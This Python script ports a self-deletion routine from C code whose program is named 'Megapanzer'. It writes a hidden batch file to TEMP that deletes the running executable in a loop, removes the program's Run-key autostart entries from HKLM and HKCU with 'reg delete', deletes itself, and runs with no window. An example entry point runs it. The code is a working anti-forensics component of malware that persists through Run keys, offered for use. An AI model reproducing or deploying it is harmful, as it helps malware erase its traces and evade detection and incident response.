import os
import sys
import time
import subprocess
import winreg
import ctypes

# Constants to mimic your C code
LOCAL_MACHINE = winreg.HKEY_LOCAL_MACHINE
CURRENT_USER = winreg.HKEY_CURRENT_USER

# The real registry name for your program
gRealRegistryName = "Megapanzer"  # or whatever the C code has in that global char array

def write_to_file(filename, command_string):
    """
    Append a line to filename, analogous to printToFile in the C code.
    """
    with open(filename, "a", encoding="utf-8") as f:
        f.write(command_string + "\r\n")

def remove_registry_entries(batch_file_path):
    """
    Replicates the loop in your C code that enumerates Run keys 
    and, if it matches gRealRegistryName, writes a 'reg delete' command 
    to the batch file.
    """
    # We'll check both HKLM and HKCU
    registry_heaps = [LOCAL_MACHINE, CURRENT_USER]
    run_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    for reg_heap in registry_heaps:
        try:
            with winreg.OpenKey(reg_heap, run_path, 0, winreg.KEY_READ) as key:
                i = 0
                while True:
                    try:
                        # Enumerate values
                        value_name, value_data, value_type = winreg.EnumValue(key, i)
                        if value_name.lower() == gRealRegistryName.lower():
                            if reg_heap == CURRENT_USER:
                                cmd = f'@reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {value_name} /f'
                            else:
                                cmd = f'@reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {value_name} /f'
                            write_to_file(batch_file_path, cmd)
                        i += 1
                    except OSError:
                        # No more values
                        break
        except OSError:
            # Key doesn't exist or no permission
            pass

def self_delete():
    """
    Python adaptation of your C selfDelete() function.
    Creates a batch file that:
      1. Tries to delete the current executable/script in a loop
      2. Removes registry entries
      3. Deletes itself
    Then runs that batch file (hidden) and exits.
    """

    # 1. Figure out our own filename:
    # If frozen into an EXE with PyInstaller or similar, sys.executable is your EXE path.
    # If just a .py script, use __file__ or sys.argv[0].
    program_name = os.path.abspath(sys.executable)  # For a frozen EXE
    # If running as .py, maybe:
    # program_name = os.path.abspath(__file__)

    # 2. Build a path for the batch file in TEMP
    timestamp = int(time.time())
    temp_dir = os.environ.get("TEMP", r"C:\Windows\Temp")
    if not os.path.isdir(temp_dir):
        temp_dir = r"C:\Windows\Temp"  # fallback

    batch_filename = f"{timestamp}.bat"
    batch_full_path = os.path.join(temp_dir, batch_filename)

    # 3. Create the batch file
    # start with something like: @echo off
    write_to_file(batch_full_path, "@echo off")
    write_to_file(batch_full_path, ":Repeat")

    # @del /F "<program_name>"
    write_to_file(batch_full_path, f'@del /F "{program_name}"')
    # if exist "<program_name>" goto Repeat
    write_to_file(batch_full_path, f'if exist "{program_name}" goto Repeat')

    # 4. Remove registry entries that match gRealRegistryName
    remove_registry_entries(batch_full_path)

    # 5. Also remove the batch file itself after it has run
    # The original code does something like:  del /F "batchfile" || move /Y "batchfile" "temp_dir"
    # We'll keep it simple:
    write_to_file(batch_full_path, f'@del /F "{batch_full_path}"')

    # 6. Run the batch file (hidden)
    # The C code calls ShellExecute with SW_HIDE. We'll do something similar with subprocess.
    # The 'start' command can be used to run it in a separate cmd window that closes automatically.
    subprocess.Popen(
        ["cmd.exe", "/C", batch_full_path],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    # 7. Exit the script so the file handle is released
    #    and the batch file can delete it successfully.
    sys.exit(0)

# --------------
# Example usage
# --------------
if __name__ == "__main__":
    print("This script will self-delete. Running in 5 seconds...")
    time.sleep(5)
    self_delete()
    # We never reach this line.
    print("If you see this, self_delete() did not exit properly.")
